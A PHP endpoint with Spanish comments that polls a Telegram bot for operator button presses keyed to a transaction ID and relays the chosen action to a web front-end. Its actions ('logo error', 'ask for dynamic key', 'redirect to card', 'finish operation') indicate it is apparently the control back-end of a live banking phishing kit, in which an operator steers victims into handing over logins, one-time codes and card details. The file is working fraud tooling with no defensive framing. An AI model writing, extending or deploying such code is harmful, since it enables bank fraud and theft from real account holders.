<?php
session_start();
header('Content-Type: application/json');

$baseDir = __DIR__;
if (!file_exists($baseDir . '/config.php')) {
    $baseDir = dirname(__DIR__);
}
if (!file_exists($baseDir . '/config.php')) {
    $baseDir = dirname(dirname(__DIR__));
}
$config = require $baseDir . '/config.php';

$transactionId = $_POST['transactionId'] ?? '';
$messageId     = $_POST['messageId'] ?? '';

if (empty($transactionId) || empty($messageId)) {
    echo json_encode(['status' => 'error', 'message' => 'Datos incompletos']);
    exit;
}

// Check actions file first
$actions_file = __DIR__ . '/actions.json';
$actions = [];
if (file_exists($actions_file)) {
    $actions = json_decode(file_get_contents($actions_file), true) ?? [];
}

if (isset($actions[$transactionId])) {
    $action = $actions[$transactionId];
    unset($actions[$transactionId]);
    file_put_contents($actions_file, json_encode($actions));
    error_log("[verificar_respuesta] Action found: $action for $transactionId");
    echo json_encode(['action' => $action]);
    exit;
}

$botToken = $config['bot_token'];
$chatId   = $config['chat_id'];
$offset   = $_SESSION['last_update_id'] ?? 0;

$ch = curl_init("https://api.telegram.org/bot{$botToken}/getUpdates?offset=" . ($offset + 1));
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_TIMEOUT, 10); // Timeout after 10 seconds
$response = curl_exec($ch);
$error = curl_error($ch);
curl_close($ch);

if ($error) {
    error_log("[verificar_respuesta] cURL error: $error");
    echo json_encode(['status' => 'error', 'message' => 'No se pudo consultar Telegram']);
    exit;
}

$data = json_decode($response, true);
if (json_last_error() !== JSON_ERROR_NONE) {
    error_log("[verificar_respuesta] JSON error: " . json_last_error_msg() . " - response: $response");
    echo json_encode(['status' => 'error', 'message' => 'Respuesta inválida de Telegram']);
    exit;
}

$action = null;

foreach ($data['result'] ?? [] as $update) {
    if (isset($update['update_id'])) {
        $_SESSION['last_update_id'] = $update['update_id'];
    }

    if (!isset($update['callback_query'])) continue;

    $callback = $update['callback_query'];
    if (strpos($callback['data'], $transactionId) === false) continue;

    list($actionType, ) = explode(':', $callback['data']);
    $action = $actionType;

    // Obtener mensaje original
    $msg        = $callback['message'] ?? [];
    $origText   = $msg['text'] ?? '';
    $origChatId = $msg['chat']['id'] ?? $chatId;
    $origMsgId  = $msg['message_id'] ?? $messageId;

    // Usuario que pulsó
    $from     = $callback['from'] ?? [];
    $operador = !empty($from['username']) ? '@' . $from['username'] :
                (trim(($from['first_name'] ?? '') . ' ' . ($from['last_name'] ?? '')) ?: 'Operador');

    $acciones = [
        'error_logo'        => 'Marcó ERROR DE LOGO',
        'pedir_dinamica'    => 'Pidió DINÁMICA',
        'error_tc'          => 'Redirigió a TARJETA',
        'confirm_finalizar' => 'FINALIZÓ la operación'
    ];
    $accionHumana = $acciones[$actionType] ?? 'Acción desconocida';

    // Editar mensaje con estado
    if ($origText !== '') {
        $newText  = $origText;
        $newText .= "\n\n————————————\n";
        $newText .= "✅ Acción: <b>{$accionHumana}</b>\n";
        $newText .= "👤 Operador: <b>{$operador}</b>";

        $editPayload = [
            'chat_id'    => $origChatId,
            'message_id' => $origMsgId,
            'text'       => $newText,
            'parse_mode' => 'HTML',
            'reply_markup' => json_encode(['inline_keyboard' => []])
        ];

        $chEdit = curl_init("https://api.telegram.org/bot{$botToken}/editMessageText");
        curl_setopt($chEdit, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($chEdit, CURLOPT_POST, true);
        curl_setopt($chEdit, CURLOPT_POSTFIELDS, json_encode($editPayload));
        curl_setopt($chEdit, CURLOPT_HTTPHEADER, ['Content-Type: application/json']);
        curl_exec($chEdit);
        curl_close($chEdit);
    }

    break;
}

echo json_encode(['action' => $action]);
